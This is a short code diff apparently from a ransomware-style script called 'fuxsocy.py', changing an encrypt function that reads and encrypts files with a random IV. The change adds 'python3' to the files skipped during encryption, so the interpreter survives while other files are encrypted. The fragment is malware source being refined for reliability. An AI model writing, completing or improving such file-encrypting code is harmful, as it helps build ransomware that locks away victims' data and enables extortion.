@@ -16,7 +16,7 @@ CS = 64*1024
 
 
 def encrypt(root, filename, key):
-    if ('fuxsocy.py' not in filename) and ('fsociety00.dat' not in filename):
+    if ('fuxsocy.py' not in filename) and ('fsociety00.dat' not in filename) and ('python3' not in filename):
         file_path = root + '/' + filename
         file_size = str(os.path.getsize(file_path)).zfill(16)
         iv = Random.new().read(16)
